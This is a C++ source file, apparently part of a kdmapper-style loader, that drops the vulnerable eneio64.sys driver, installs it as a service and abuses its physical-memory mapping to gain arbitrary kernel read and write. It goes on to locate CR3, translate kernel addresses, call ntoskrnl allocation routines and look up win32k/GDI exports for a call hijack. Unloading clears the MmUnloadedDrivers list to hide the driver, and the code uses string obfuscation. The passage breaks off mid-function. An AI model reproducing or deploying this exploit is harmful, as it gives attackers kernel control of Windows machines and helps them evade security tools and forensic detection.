#include "EneIo64Driver.h"
#include <Driver/kdmapper/service.hpp>
#include <Driver/kdmapper/utils.hpp>
#include <Driver/kdmapper/eneio64_driver_resource.hpp>
#include <Infrastructure/Logger.h>
#include <Miscellaneous/Protection/External/oxorany_include.h>
#include <psapi.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

static const char* k_DriverName = "eneio64.sys";

EneIo64Driver::EneIo64Driver()
{
}

EneIo64Driver::~EneIo64Driver()
{
    Unload();
}

bool EneIo64Driver::Load()
{
    if (m_DriverHandle != INVALID_HANDLE_VALUE && m_DriverHandle != nullptr)
        return true;

    Logger::Log(WRAPPER_MARCO("[EneIo] Load() start"));

    char temp_path[MAX_PATH] = { 0 };
    if (!GetTempPathA(sizeof(temp_path), temp_path))
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] FAIL GetTempPath"));
        return false;
    }

    std::string driver_path = std::string(temp_path) + "eneio64.sys";

    // Stop any leftover service from a previous run BEFORE writing the file
    // (otherwise the old driver holds the file locked)
    Logger::Log(WRAPPER_MARCO("[EneIo] cleaning up any leftover service..."));
    service::StopAndRemove(k_DriverName);
    Sleep(500);
    Logger::Flush();

    std::remove(driver_path.c_str());
    Logger::Log(WRAPPER_MARCO("[EneIo] extracting driver to:"));
    Logger::Log(driver_path.c_str());

    if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(eneio64_driver_resource::driver), eneio64_driver_resource::size))
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] FAIL CreateFileFromMemory"));
        Logger::LogHex(WRAPPER_MARCO("[EneIo] LastError during write"), GetLastError());
        Logger::Flush();
        return false;
    }
    Logger::Log(WRAPPER_MARCO("[EneIo] driver extracted OK"));

    Logger::Log(WRAPPER_MARCO("[EneIo] RegisterAndStart..."));
    if (!service::RegisterAndStart(driver_path))
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] FAIL RegisterAndStart"));
        std::remove(driver_path.c_str());
        return false;
    }
    Logger::Log(WRAPPER_MARCO("[EneIo] RegisterAndStart OK"));

    Logger::Log(WRAPPER_MARCO("[EneIo] CreateFileW device..."));
    m_DriverHandle = CreateFileW(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (m_DriverHandle == INVALID_HANDLE_VALUE || !m_DriverHandle)
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] FAIL CreateFileW device"));
        service::StopAndRemove(k_DriverName);
        std::remove(driver_path.c_str());
        return false;
    }
    Logger::Log(WRAPPER_MARCO("[EneIo] CreateFileW device OK"));

    MEMORYSTATUSEX mem_status = { sizeof(mem_status) };
    if (!GlobalMemoryStatusEx(&mem_status))
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] FAIL GlobalMemoryStatusEx"));
        CloseHandle(m_DriverHandle);
        m_DriverHandle = INVALID_HANDLE_VALUE;
        service::StopAndRemove(k_DriverName);
        std::remove(driver_path.c_str());
        return false;
    }
    m_TotalPhysicalMemory = mem_status.ullTotalPhys;
    Logger::LogHex(WRAPPER_MARCO("[EneIo] TotalPhysicalMemory"), m_TotalPhysicalMemory);

    Logger::Log(WRAPPER_MARCO("[EneIo] GrowMapping initial..."));

    if (!GrowMapping(kInitialMapSize))
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] FAIL GrowMapping initial"));
        CloseHandle(m_DriverHandle);
        m_DriverHandle = INVALID_HANDLE_VALUE;
        service::StopAndRemove(k_DriverName);
        std::remove(driver_path.c_str());
        return false;
    }
    Logger::LogHex(WRAPPER_MARCO("[EneIo] MappedMemoryBase"), reinterpret_cast<uint64_t>(m_MappedMemoryBase));
    Logger::LogHex(WRAPPER_MARCO("[EneIo] MappedSize"), m_MappedSize);

    Logger::Log(WRAPPER_MARCO("[EneIo] DiscoverCR3..."));
    if (!DiscoverCR3())
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] FAIL DiscoverCR3"));
        UnmapPhysicalMemory();
        CloseHandle(m_DriverHandle);
        m_DriverHandle = INVALID_HANDLE_VALUE;
        service::StopAndRemove(k_DriverName);
        std::remove(driver_path.c_str());
        return false;
    }
    Logger::LogHex(WRAPPER_MARCO("[EneIo] DiscoverCR3 OK, CR3"), m_CachedCR3);

    m_NtoskrnlBase = GetKernelBase();
    Logger::LogHex(WRAPPER_MARCO("[EneIo] NtoskrnlBase"), m_NtoskrnlBase);

    Logger::Log(WRAPPER_MARCO("[EneIo] Load() returning true"));
    return true;
}

void EneIo64Driver::Unload()
{
    if (m_DriverHandle != INVALID_HANDLE_VALUE && m_DriverHandle != nullptr)
    {
        ClearMmUnloadedDrivers();
        UnmapPhysicalMemory();
        CloseHandle(m_DriverHandle);
        m_DriverHandle = INVALID_HANDLE_VALUE;
    }
    else
    {
        UnmapPhysicalMemory();
    }

    service::StopAndRemove(k_DriverName);

    char temp_path[MAX_PATH] = { 0 };
    GetTempPathA(sizeof(temp_path), temp_path);
    std::string driver_path = std::string(temp_path) + "eneio64.sys";
    std::remove(driver_path.c_str());
}

bool EneIo64Driver::GrowMapping(uint64_t needed_up_to)
{
    if (m_MappedMemoryBase && m_MappedSize >= needed_up_to)
        return true;
    if (m_DriverHandle == INVALID_HANDLE_VALUE || !m_DriverHandle)
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] GrowMapping: invalid handle"));
        return false;
    }

    Logger::LogHex(WRAPPER_MARCO("[EneIo] GrowMapping: need up to"), needed_up_to);
    Logger::LogHex(WRAPPER_MARCO("[EneIo] GrowMapping: current size"), m_MappedSize);

    if (m_MappedMemoryBase)
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] GrowMapping: unmapping old"));
        UnmapPhysicalMemory();
    }

    uint64_t new_size = m_TotalPhysicalMemory;
    if (needed_up_to < m_TotalPhysicalMemory)
    {
        new_size = max(needed_up_to, m_MappedSize > 0 ? m_MappedSize * 2 : kInitialMapSize);
        if (new_size > m_TotalPhysicalMemory)
            new_size = m_TotalPhysicalMemory;
    }

    Logger::LogHex(WRAPPER_MARCO("[EneIo] GrowMapping: new_size"), new_size);

    PHYS_MAP_INPUT input = { 0 };
    input.Size = new_size;

    DWORD bytes_returned = 0;
    BOOL ioctl_result = DeviceIoControl(m_DriverHandle, IOCTL_MAP_PHYS_TO_LIN, &input, sizeof(input), &input, sizeof(input), &bytes_returned, nullptr);
    if (!ioctl_result)
    {
        Logger::LogHex(WRAPPER_MARCO("[EneIo] FAIL IOCTL_MAP_PHYS_TO_LIN, error"), GetLastError());
        return false;
    }

    Logger::LogHex(WRAPPER_MARCO("[EneIo] IOCTL returned MappingAddress"), input.MappingAddress);
    Logger::LogHex(WRAPPER_MARCO("[EneIo] IOCTL returned Size"), input.Size);

    if (!input.MappingAddress)
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] FAIL: MappingAddress is null"));
        return false;
    }

    m_MappedMemoryBase = reinterpret_cast<void*>(input.MappingAddress);
    m_MappedSize = input.Size;
    Logger::LogHex(WRAPPER_MARCO("[EneIo] GrowMapping OK, base"), reinterpret_cast<uint64_t>(m_MappedMemoryBase));
    Logger::LogHex(WRAPPER_MARCO("[EneIo] GrowMapping OK, size"), m_MappedSize);
    return true;
}

void EneIo64Driver::UnmapPhysicalMemory()
{
    if (!m_MappedMemoryBase || m_DriverHandle == INVALID_HANDLE_VALUE)
        return;

    PHYS_MAP_INPUT input = { 0 };
    input.Size = m_MappedSize;
    input.MappingAddress = reinterpret_cast<uint64_t>(m_MappedMemoryBase);

    DWORD bytes_returned = 0;
    DeviceIoControl(m_DriverHandle, IOCTL_UNMAP_PHYS_ADDR, &input, sizeof(input), &input, sizeof(input), &bytes_returned, nullptr);

    Logger::LogHex(WRAPPER_MARCO("[EneIo] Unmapped physical memory, was size"), m_MappedSize);

    m_MappedMemoryBase = nullptr;
    m_MappedSize = 0;
}

bool EneIo64Driver::PhysRead(uint64_t phys_addr, void* buffer, uint32_t size)
{
    if (!m_MappedMemoryBase)
        return false;
    if (phys_addr + size > m_MappedSize)
    {
        if (!GrowMapping(phys_addr + size))
            return false;
    }
    if (phys_addr + size > m_MappedSize)
        return false;

    memcpy(buffer, reinterpret_cast<uint8_t*>(m_MappedMemoryBase) + phys_addr, size);
    return true;
}

bool EneIo64Driver::PhysWrite(uint64_t phys_addr, const void* buffer, uint32_t size)
{
    if (!m_MappedMemoryBase)
        return false;
    if (phys_addr + size > m_MappedSize)
    {
        if (!GrowMapping(phys_addr + size))
            return false;
    }
    if (phys_addr + size > m_MappedSize)
        return false;

    memcpy(reinterpret_cast<uint8_t*>(m_MappedMemoryBase) + phys_addr, buffer, size);
    return true;
}

uint64_t EneIo64Driver::FindEntryPointRva()
{
    WCHAR system_dir[MAX_PATH] = { 0 };
    if (!GetSystemDirectoryW(system_dir, MAX_PATH))
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] FindEntryPointRva: FAIL GetSystemDirectory"));
        return 0;
    }

    std::wstring ntos_path = std::wstring(system_dir) + L"\\ntoskrnl.exe";

    HANDLE hFile = CreateFileW(ntos_path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] FindEntryPointRva: FAIL open file"));
        return 0;
    }

    HANDLE hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping)
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] FindEntryPointRva: FAIL CreateFileMapping"));
        CloseHandle(hFile);
        return 0;
    }

    void* view = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!view)
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] FindEntryPointRva: FAIL MapViewOfFile"));
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return 0;
    }

    uint64_t entry_rva = 0;
    PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(view);
    if (dos->e_magic == IMAGE_DOS_SIGNATURE)
    {
        PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(static_cast<uint8_t*>(view) + dos->e_lfanew);
        if (nt->Signature == IMAGE_NT_SIGNATURE && nt->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
        {
            entry_rva = nt->OptionalHeader.AddressOfEntryPoint;
        }
        else
        {
            Logger::Log(WRAPPER_MARCO("[EneIo] FindEntryPointRva: invalid PE signature"));
        }
    }
    else
    {
        Logger::Log(WRAPPER_MARCO("[EneIo] FindEntryPointRva: invalid DOS signature"));
    }

    UnmapViewOfFile(view);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    Logger::LogHex(WRAPPER_MARCO("[EneIo] FindEntryPointRva result"), entry_rva);
    return entry_rva;
}

bool EneIo64Driver::DiscoverCR3()
{
    Logger::Log(WRAPPER_MARCO("[EneIo] DiscoverCR3 start"));
    Logger::Flush();

    // Strategy 1: KiSystemStartup signature match (HVCI systems)
    // Get ntos_base from NtQuerySystemInformation
    uint64_t ntos_base = GetKernelBase();
    Logger::LogHex(WRAPPER_MARCO("[EneIo] DiscoverCR3: ntos_base"), ntos_base);

    bool found_by_kiss = false;
    uint64_t kiss_match_offset = 0;

    if (ntos_base)
    {
        uint64_t entry_point_rva = FindEntryPointRva();
        Logger::LogHex(WRAPPER_MARCO("[EneIo] DiscoverCR3: entry_point_rva"), entry_point_rva);

        if (entry_point_rva)
        {
            uint64_t ki_system_startup_va = ntos_base + entry_point_rva;
            Logger::LogHex(WRAPPER_MARCO("[EneIo] DiscoverCR3: KiSystemStartup VA"), ki_system_startup_va);

            for (uint64_t offset = 0; offset < 0x100000; offset += 8)
            {
                uint64_t value = 0;
                if (!PhysRead(offset, &value, sizeof(value)))
                    continue;

                if (value == ki_system_startup_va)
                {
                    Logger::LogHex(WRAPPER_MARCO("[EneIo] KiSS: matched at physical offset"), offset);
                    kiss_match_offset = offset;

                    uint64_t low_stub_base = offset - 0x188;
                    uint64_t cr3 = 0;
                    if (PhysRead(low_stub_base + 0xA0, &cr3, sizeof(cr3)))
                    {
                        Logger::LogHex(WRAPPER_MARCO("[EneIo] KiSS: CR3 candidate"), cr3);
                        if ((cr3 & 0xFFF) == 0 && (cr3 >> 52) == 0)
                        {
                            // Validate: read PML4E from this CR3
                            uint64_t pml4e = 0;
                            if (PhysRead(cr3, &pml4e, sizeof(pml4e)) && (pml4e & 1) && (pml4e & 0xFFFFFFFFFF000))
                            {
                                Logger::LogHex(WRAPPER_MARCO("[EneIo] KiSS: PML4E validated"), pml4e);
                                m_CachedCR3 = cr3;
                                Logger::LogHex(WRAPPER_MARCO("[EneIo] DiscoverCR3 SUCCESS via KiSystemStartup, CR3"), cr3);
                                Logger::Flush();
                                return true;
                            }
                        }
                    }
                }
            }
        }
    }

    // Strategy 2: PML4E validation scan (works on ALL Windows versions)
    // Scan each page in 0x0-0x100000 for CR3 candidates at LowStub+0xA0
    Logger::Log(WRAPPER_MARCO("[EneIo] DiscoverCR3: KiSS failed, trying PML4E validation scan"));
    Logger::Flush();

    uint64_t pages_scanned = 0;
    uint64_t pages_with_valid_cr3 = 0;

    for (uint64_t page = 0; page < 0x100000; page += 0x1000)
    {
        pages_scanned++;

        uint64_t cr3 = 0;
        if (!PhysRead(page + 0xA0, &cr3, sizeof(cr3)))
        {
            if (page < 0x10000 && (page % 0x5000 == 0))
                Logger::LogHex(WRAPPER_MARCO("[EneIo] PML4E: PhysRead fail at page"), page);
            continue;
        }

        // CR3 must be page-aligned
        if ((cr3 & 0xFFF) != 0)
            continue;
        // Upper reserved bits must be zero
        if ((cr3 >> 52) != 0)
            continue;
        // Must have at least some PFN bits
        if (cr3 == 0)
            continue;

        // Validate: read PML4E from the candidate CR3
        uint64_t pml4e = 0;
        if (!PhysRead(cr3, &pml4e, sizeof(pml4e)))
            continue;
        // PML4E must have Present bit
        if (!(pml4e & 1))
            continue;
        // PML4E must have a non-zero page frame
        if ((pml4e & 0xFFFFFFFFFF000) == 0)
            continue;

        pages_with_valid_cr3++;

        // Read a second PML4E to further validate
        uint64_t pml4e2 = 0;
        if (!PhysRead(cr3 + 8, &pml4e2, sizeof(pml4e2)))
            continue;

        // On a real system, at least one more PML4 entry should be present
        if (!(pml4e2 & 1))
        {
            // Second entry might be empty - that's OK on some systems.
            // Accept the CR3 anyway since the first entry validated.
        }

        Logger::LogHex(WRAPPER_MARCO("[EneIo] PML4E scan: found CR3 at page"), page);
        Logger::LogHex(WRAPPER_MARCO("[EneIo] PML4E scan: CR3 value"), cr3);
        Logger::LogHex(WRAPPER_MARCO("[EneIo] PML4E scan: PML4E[0]"), pml4e);

        m_CachedCR3 = cr3;
        Logger::LogHex(WRAPPER_MARCO("[EneIo] DiscoverCR3 SUCCESS via PML4E scan, CR3"), cr3);
        Logger::Flush();
        return true;
    }

    Logger::LogHex(WRAPPER_MARCO("[EneIo] DiscoverCR3 FAIL: pages scanned"), pages_scanned);
    Logger::LogHex(WRAPPER_MARCO("[EneIo] DiscoverCR3 FAIL: pages with valid CR3"), pages_with_valid_cr3);
    Logger::Flush();

    // Strategy 3: brute force - try every 8-byte aligned offset for CR3
    Logger::Log(WRAPPER_MARCO("[EneIo] DiscoverCR3: PML4E scan failed, trying brute force"));
    Logger::Flush();

    for (uint64_t offset = 0; offset < 0x100000; offset += 8)
    {
        uint64_t cr3 = 0;
        if (!PhysRead(offset, &cr3, sizeof(cr3)))
            continue;

        if ((cr3 & 0xFFF) != 0 || (cr3 >> 52) != 0 || cr3 == 0)
            continue;

        uint64_t pml4e = 0;
        if (!PhysRead(cr3, &pml4e, sizeof(pml4e)) || !(pml4e & 1) || (pml4e & 0xFFFFFFFFFF000) == 0)
            continue;

        Logger::LogHex(WRAPPER_MARCO("[EneIo] Brute: found CR3 at offset"), offset);
        Logger::LogHex(WRAPPER_MARCO("[EneIo] Brute: CR3 value"), cr3);
        Logger::LogHex(WRAPPER_MARCO("[EneIo] Brute: PML4E[0]"), pml4e);

        m_CachedCR3 = cr3;
        Logger::LogHex(WRAPPER_MARCO("[EneIo] DiscoverCR3 SUCCESS via brute force, CR3"), cr3);
        Logger::Flush();
        return true;
    }

    Logger::Log(WRAPPER_MARCO("[EneIo] DiscoverCR3: all strategies failed"));
    Logger::Flush();
    return false;
}

uint64_t EneIo64Driver::FindKernelCR3()
{
    // Scan physical pages near the cached CR3 for a PML4 that has PML4E[511] (system space) present.
    // The kernel CR3 on KPTI systems has the full system entries, while user CR3 has limited/no system pages.
    uint64_t sys_addr = static_cast<uint64_t>(0xFFFF800000000000);
    uint16_t sys_pml4_idx = (sys_addr >> 39) & 0x1FF;
    uint16_t sys_pml5_idx = (sys_addr >> 48) & 0x1FF;

    uint64_t start = (m_CachedCR3 & ~0xFFF) - 0x10000;
    uint64_t end = (m_CachedCR3 & ~0xFFF) + 0x10000;
    for (uint64_t page = start; page <= end; page += 0x1000)
    {
        if (page == 0) continue;

        // Check PML4E[511] for 4-level, or PML5E[0x1FF] for 5-level
        uint64_t sys_entry = 0;
        if (!PhysRead(page + sys_pml4_idx * 8, &sys_entry, sizeof(sys_entry)))
            continue;
        if (!(sys_entry & 1) || (sys_entry & 0xFFFFFFFFFF000) == 0)
        {
            // Try 5-level: PML5E[511] should be present
            if (!PhysRead(page + sys_pml5_idx * 8, &sys_entry, sizeof(sys_entry)))
                continue;
            if (!(sys_entry & 1) || (sys_entry & 0xFFFFFFFFFF000) == 0)
                continue;
        }

        // Verify user PML4E[0] / PML5E[0] is valid
        uint64_t usr_entry = 0;
        if (!PhysRead(page, &usr_entry, sizeof(usr_entry)))
            continue;
        if (!(usr_entry & 1))
            continue;

        Logger::LogHex(WRAPPER_MARCO("[EneIo] FindKernelCR3 found"), page);
        Logger::Flush();
        return page;
    }
    return 0;
}

uint64_t EneIo64Driver::VirtToPhysWithPML4(uint64_t cr3, uint64_t virt_addr, bool five_level)
{
    uint16_t pml5_idx = 0, pml4_idx = 0;

    if (five_level)
    {
        pml5_idx = (virt_addr >> 48) & 0x1FF;
        pml4_idx = (virt_addr >> 39) & 0x1FF;
    }
    else
    {
        pml4_idx = (virt_addr >> 39) & 0x1FF;
    }

    uint16_t pdpt_idx = (virt_addr >> 30) & 0x1FF;
    uint16_t pd_idx = (virt_addr >> 21) & 0x1FF;
    uint16_t pt_idx = (virt_addr >> 12) & 0x1FF;
    uint64_t offset = virt_addr & 0xFFF;

    uint64_t pml4e_base = cr3;
    if (five_level)
    {
        uint64_t pml5e = 0;
        if (!PhysRead(cr3 + pml5_idx * 8, &pml5e, sizeof(pml5e)))
            return 0;
        if (!(pml5e & 1))
            return 0;
        pml4e_base = pml5e & 0xFFFFFFFFFF000;
    }

    uint64_t pml4e = 0;
    if (!PhysRead(pml4e_base + pml4_idx * 8, &pml4e, sizeof(pml4e)))
        return 0;
    if (!(pml4e & 1))
        return 0;

    uint64_t pdpt_base = pml4e & 0xFFFFFFFFFF000;
    uint64_t pdpte = 0;
    if (!PhysRead(pdpt_base + pdpt_idx * 8, &pdpte, sizeof(pdpte)))
        return 0;
    if (!(pdpte & 1))
        return 0;
    if (pdpte & (1 << 7))
        return (pdpte & 0xFFFFFC0000000) + (virt_addr & 0x3FFFFFFF);

    uint64_t pd_base = pdpte & 0xFFFFFFFFFF000;
    uint64_t pde = 0;
    if (!PhysRead(pd_base + pd_idx * 8, &pde, sizeof(pde)))
        return 0;
    if (!(pde & 1))
        return 0;
    if (pde & (1 << 7))
        return (pde & 0xFFFFFFFE00000) + (virt_addr & 0x1FFFFF);

    uint64_t pt_base = pde & 0xFFFFFFFFFF000;
    uint64_t pte = 0;
    if (!PhysRead(pt_base + pt_idx * 8, &pte, sizeof(pte)))
        return 0;
    if (!(pte & 1))
        return 0;

    return (pte & 0xFFFFFFFFFF000) + offset;
}

uint64_t EneIo64Driver::VirtToPhys(uint64_t virt_addr)
{
    if (!m_CachedCR3)
        return 0;

    // Try each CR3 with both 4-level and 5-level paging
    uint64_t cr3s_to_try[8];
    int num_cr3s = 0;
    cr3s_to_try[num_cr3s++] = m_CachedCR3;

    if (!m_KernelCR3)
        m_KernelCR3 = FindKernelCR3();
    if (m_KernelCR3 && m_KernelCR3 != m_CachedCR3)
        cr3s_to_try[num_cr3s++] = m_KernelCR3;

    uint64_t extra_cr3s[] = {
        m_CachedCR3 + 0x1000, m_CachedCR3 - 0x1000,
        m_CachedCR3 + 0x2000, m_CachedCR3 - 0x2000,
    };
    for (auto e : extra_cr3s)
    {
        if (num_cr3s < 8)
            cr3s_to_try[num_cr3s++] = e;
    }

    for (int i = 0; i < num_cr3s; ++i)
    {
        uint64_t cr3 = cr3s_to_try[i];
        // Try 4-level paging first
        uint64_t pa = VirtToPhysWithPML4(cr3, virt_addr, false);
        if (pa && pa < m_TotalPhysicalMemory)
            return pa;
        // Try 5-level paging
        pa = VirtToPhysWithPML4(cr3, virt_addr, true);
        if (pa && pa < m_TotalPhysicalMemory)
            return pa;
    }

    return 0;
}

uint64_t EneIo64Driver::GetKernelBase()
{
    return utils::GetKernelModuleAddress("ntoskrnl.exe");
}

bool EneIo64Driver::ReadMemory(uint64_t virt_addr, void* buffer, uint64_t size)
{
    uint8_t* buf = reinterpret_cast<uint8_t*>(buffer);
    uint64_t offset = 0;

    while (offset < size)
    {
        uint64_t va = virt_addr + offset;
        uint64_t pa = VirtToPhys(va);
        if (!pa)
            return false;

        uint64_t page_offset = va & 0xFFF;
        uint64_t to_read = min(0x1000 - page_offset, size - offset);

        if (!PhysRead(pa, buf + offset, static_cast<uint32_t>(to_read)))
            return false;

        offset += to_read;
    }

    return true;
}

bool EneIo64Driver::WriteMemory(uint64_t virt_addr, const void* buffer, uint64_t size)
{
    const uint8_t* buf = reinterpret_cast<const uint8_t*>(buffer);
    uint64_t offset = 0;

    while (offset < size)
    {
        uint64_t va = virt_addr + offset;
        uint64_t pa = VirtToPhys(va);
        if (!pa)
            return false;

        uint64_t page_offset = va & 0xFFF;
        uint64_t to_write = min(0x1000 - page_offset, size - offset);

        if (!PhysWrite(pa, buf + offset, static_cast<uint32_t>(to_write)))
            return false;

        offset += to_write;
    }

    return true;
}

bool EneIo64Driver::WriteToReadOnlyMemory(uint64_t address, const void* buffer, uint32_t size)
{
    return WriteMemory(address, buffer, size);
}

bool EneIo64Driver::SetMemory(uint64_t address, uint32_t value, uint64_t size)
{
    uint8_t* temp = static_cast<uint8_t*>(_alloca(size));
    memset(temp, value, size);
    return WriteMemory(address, temp, size);
}

uint64_t EneIo64Driver::AllocatePool(uint32_t pool_type, uint64_t size)
{
    if (!size)
        return 0;

    static uint64_t kernel_ExAllocatePool = 0;

    if (!kernel_ExAllocatePool)
    {
        uint64_t ntos_base = m_NtoskrnlBase;
        if (!ntos_base)
            return 0;
        kernel_ExAllocatePool = GetKernelModuleExport(ntos_base, "ExAllocatePool");
    }

    uint64_t allocated_pool = 0;

    if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePool, pool_type, size))
        return 0;

    return allocated_pool;
}

bool EneIo64Driver::FreePool(uint64_t address)
{
    if (!address)
        return false;

    static uint64_t kernel_ExFreePool = 0;

    if (!kernel_ExFreePool)
    {
        uint64_t ntos_base = m_NtoskrnlBase;
        if (!ntos_base)
            return false;
        kernel_ExFreePool = GetKernelModuleExport(ntos_base, "ExFreePool");
    }

    return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
}

void EneIo64Driver::DumpModuleExports(const char* mod_name, uint64_t kernel_module_base, uint32_t max_names)
{
    if (!kernel_module_base) return;

    IMAGE_DOS_HEADER dos_header = { 0 };
    IMAGE_NT_HEADERS64 nt_headers = { 0 };

    if (!ReadMemory(kernel_module_base, &dos_header, sizeof(dos_header)) ||
        dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
        !ReadMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) ||
        nt_headers.Signature != IMAGE_NT_SIGNATURE)
        return;

    const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    if (!export_base || !export_base_size) return;

    const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!ReadMemory(kernel_module_base + export_base, export_data, export_base_size))
    {
        VirtualFree(export_data, 0, MEM_RELEASE);
        return;
    }

    const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;
    const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);

    uint32_t count = min(max_names, export_data->NumberOfNames);
    Logger::Log(WRAPPER_MARCO("[EneIo] first exports from"));
    Logger::Log(mod_name);
    for (uint32_t i = 0; i < count; ++i)
    {
        const std::string name = std::string(reinterpret_cast<char*>(name_table[i] + delta));
        Logger::Log(name.c_str());
    }
    Logger::Flush();

    VirtualFree(export_data, 0, MEM_RELEASE);
}

uint64_t EneIo64Driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name)
{
    if (!kernel_module_base)
        return 0;

    IMAGE_DOS_HEADER dos_header = { 0 };
    IMAGE_NT_HEADERS64 nt_headers = { 0 };

    if (!ReadMemory(kernel_module_base, &dos_header, sizeof(dos_header)) ||
        dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
        !ReadMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) ||
        nt_headers.Signature != IMAGE_NT_SIGNATURE)
        return 0;

    const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    if (!export_base || !export_base_size)
        return 0;

    const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    if (!ReadMemory(kernel_module_base + export_base, export_data, export_base_size))
    {
        VirtualFree(export_data, 0, MEM_RELEASE);
        return 0;
    }

    const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

    const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
    const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
    const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

    for (auto i = 0u; i < export_data->NumberOfNames; ++i)
    {
        const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

        if (!_stricmp(current_function_name.c_str(), function_name.c_str()))
        {
            const auto function_ordinal = ordinal_table[i];
            const auto function_address = kernel_module_base + function_table[function_ordinal];

            if (function_address >= kernel_module_base + export_base &&
                function_address <= kernel_module_base + export_base + export_base_size)
            {
                VirtualFree(export_data, 0, MEM_RELEASE);
                return 0;
            }

            VirtualFree(export_data, 0, MEM_RELEASE);
            return function_address;
        }
    }

    VirtualFree(export_data, 0, MEM_RELEASE);
    return 0;
}

bool EneIo64Driver::GetGdiKernelInfo(
    const char* function_name,
    uint64_t* out_kernel_function_ptr,
    uint64_t* out_kernel_original_function_address)
{
    if (m_HasGdiInfo && m_GdiFunctionName == function_name)
    {
        *out_kernel_function_ptr = m_GdiKernelPtr;
        *out_kernel_original_function_address = m_GdiOriginalFunction;
        return true;
    }

    uint64_t kernel_NtGdiAddress = 0;
    const char* found_mod = nullptr;

    Logger::Log(WRAPPER_MARCO("[EneIo] scanning module list for graphics modules..."));
    Logger::Flush();

    // Dump all kernel module names to find the right graphics module name
    {
        void* buf = nullptr;
        DWORD sz = 0;
        NTSTATUS st = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation), buf, sz, &sz);
        while (st == nt::STATUS_INFO_LENGTH_MISMATCH)
        {
            VirtualFree(buf, 0, MEM_RELEASE);
            buf = VirtualAlloc(nullptr, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            st = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemModuleInformation), buf, sz, &sz);
        }
        if (NT_SUCCESS(st))
        {
            const auto mods = static_cast<nt::PRTL_PROCESS_MODULES>(buf);
            Logger::Log(WRAPPER_MARCO("[EneIo] total kernel modules:"));
            Logger::Log(std::to_string(mods->NumberOfModules).c_str());
            for (auto i = 0u; i < mods->NumberOfModules; ++i)
            {
                const std::string fname = std::string(reinterpret_cast<char*>(mods->Modules[i].FullPathName) + mods->Modules[i].OffsetToFileName);
                std::string lower = fname;
                for (auto& c : lower) c = static_cast<char>(tolower(c));
                if (lower.find("win") != std::string::npos || lower.find("gdi") != std::string::npos || lower.find("dxg") != std::string::npos)
                {
                    Logger::Log(fname.c_str());
                }
            }
            Logger::Flush();
        }
        VirtualFree(buf, 0, MEM_RELEASE);
    }

    // Phase 1: try named export lookup across graphics modules
    const char* gdi_modules[] = {
        "win32k.sys",
        "win32kfull.sys",
        "win32kbase.sys",
        "dxgkrnl.sys"
    };
    for (auto mod : gdi_modules)
    {
        uint64_t base = utils::GetKernelModuleAddress(mod);
        if (base)
        {
            Logger::Log(WRAPPER_MARCO("[EneIo] found module:"));
            Logger::Log(mod);
            DumpModuleExports(mod, base, 10);

            kernel_NtGdiAddress = GetKernelModuleExport(base, function_name);
            if (kernel_NtGdiAddress)
            {
                Logger::Log(WRAPPER_MARCO("[EneIo] found export in"));
                Logger::Log(mod);
